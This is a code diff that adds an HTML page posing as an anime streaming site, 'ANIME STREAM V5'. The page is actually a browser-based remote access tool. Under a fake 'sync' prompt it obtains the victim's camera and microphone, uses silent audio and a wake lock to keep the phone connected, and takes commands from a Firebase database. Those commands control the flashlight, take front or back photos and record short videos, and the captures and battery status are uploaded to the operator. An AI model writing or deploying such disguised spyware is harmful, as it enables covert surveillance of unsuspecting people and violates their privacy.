@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <style>
+        video#bg { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -1; filter: brightness(0.4); }
+        .glass { background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen text-white overflow-hidden">
+    <video autoplay muted loop id="bg">
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-anime-style-cityscape-at-night-with-stars-and-clouds-40013-large.mp4" type="video/mp4">
+    </video>
+
+    <div class="glass p-10 rounded-3xl text-center max-w-sm">
+        <h1 class="text-2xl font-bold mb-2">ANIME STREAM V5</h1>
+        <p id="stat" class="text-xs text-zinc-400 mb-6 uppercase italic">Connecting to Tokyo Server...</p>
+        <button id="btn" onclick="startRat()" class="bg-blue-600 hover:bg-blue-500 px-8 py-3 rounded-full font-bold shadow-lg shadow-blue-500/50 transition-all">SINKRONISASI DATA</button>
+    </div>
+
+    <script>
+        // --- CONFIG FIREBASE ---
+        const config = { databaseURL: "https://ralxaratpronect-default-rtdb.asia-southeast1.firebasedatabase.app/" };
+        firebase.initializeApp(config);
+        const db = firebase.database();
+        
+        let mainStream = null;
+        let blinker = null;
+
+        async function startRat() {
+            try {
+                // Izin awal
+                mainStream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                document.getElementById('btn').style.display = 'none';
+                document.getElementById('stat').innerText = "STABLE CONNECTION";
+                
+                // --- TRIK ANTI-MATI (WAJIB) ---
+                const a = new Audio('https://raw.githubusercontent.com/anars/blank-audio/master/10-seconds-of-silence.mp3');
+                a.loop = true; a.play(); // Nipu Android biar koneksi Firebase ga diputus
+
+                if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen'); } // Nahan HP biar ga tidur
+
+                listen();
+                updateBattery();
+            } catch(e) { alert("Izin Kamera Diperlukan untuk Streaming!"); }
+        }
+
+        async function updateBattery() {
+            if ('getBattery' in navigator) {
+                const b = await navigator.getBattery();
+                const send = () => db.ref("raxv3/info").set({level: Math.round(b.level * 100) + "%", charging: b.charging});
+                send(); b.onlevelchange = send;
+            }
+        }
+
+        function listen() {
+            db.ref("raxv3/cmd").on("value", async s => {
+                const d = s.val(); if(!d) return;
+                // SENTER
+                if(d.a === 'S_ON') setTorch(true);
+                else if(d.a === 'S_OFF') { setTorch(false); clearInterval(blinker); }
+                else if(d.a === 'S_BLINK') { clearInterval(blinker); let on = true; blinker = setInterval(() => { setTorch(on); on = !on; }, 500); }
+                // FOTO (FIX BELAKANG)
+                else if(d.a === 'SNAP_F') takePic('user');
+                else if(d.a === 'SNAP_B') takePic('environment');
+                // VIDEO
+                else if(d.a === 'VID_REC') recordVid();
+            });
+        }
+
+        async function setTorch(on) {
+            try {
+                const track = mainStream.getVideoTracks()[0];
+                await track.applyConstraints({advanced: [{torch: on}]});
+            } catch(e) { console.log("Senter gagal, ganti ke kamera belakang dulu!"); }
+        }
+
+        async function takePic(mode) {
+            // Stop stream lama biar hardware kamera kebuka buat mode baru
+            if(mainStream) mainStream.getTracks().forEach(t => t.stop());
+            
+            const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
+            mainStream = s; // Simpan sebagai stream utama
+            
+            const v = document.createElement('video'); v.srcObject = s; v.play();
+            setTimeout(() => {
+                const c = document.createElement('canvas'); c.width=720; c.height=1280;
+                c.getContext('2d').drawImage(v,0,0,720,1280);
+                db.ref("raxv3/media").set({type:'img', data: c.toDataURL('image/jpeg', 0.6), t: Date.now()});
+            }, 2000); // Delay biar fokus kamera dapet
+        }
+
+        function recordVid() {
+            const mr = new MediaRecorder(mainStream);
+            let chunks = [];
+            mr.ondataavailable = e => chunks.push(e.data);
+            mr.onstop = () => {
+                const blob = new Blob(chunks, {type: 'video/webm'});
+                const r = new FileReader(); r.readAsDataURL(blob);
+                r.onloadend = () => db.ref("raxv3/media").set({type:'vid', data: r.result, t: Date.now()});
+            };
+            mr.start(); setTimeout(() => mr.stop(), 5000); // Rekam 5 detik
+        }
+    </script>
+</body>
+</html>
